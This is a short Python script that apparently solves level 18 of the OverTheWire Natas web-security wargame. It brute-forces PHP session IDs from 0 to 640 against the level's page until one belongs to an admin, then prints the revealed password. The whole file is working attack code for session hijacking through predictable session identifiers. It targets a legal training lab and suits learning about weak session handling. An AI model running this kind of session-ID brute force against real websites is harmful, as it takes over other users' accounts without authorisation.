#!/usr/bin/env python
import sys
import requests

target = 'http://natas18.natas.labs.overthewire.org/index.php'
auth = ('natas18','<redacted>')
true = 'You are an admin'
id = 0

print '[+] Starting..'

while id <= 640:
    cookie = {'PHPSESSID':str(id)}
    r = requests.get(target, auth=auth, cookies=cookie)
    sys.stdout.write('\r[+] Session: {}'.format(id))
    sys.stdout.flush()
    id += 1
    if r.content.find(true) > 0:
        sys.stdout.write('\n')
        print '[+] ' + r.content[891:933]
        break

print '[+] Complete..'
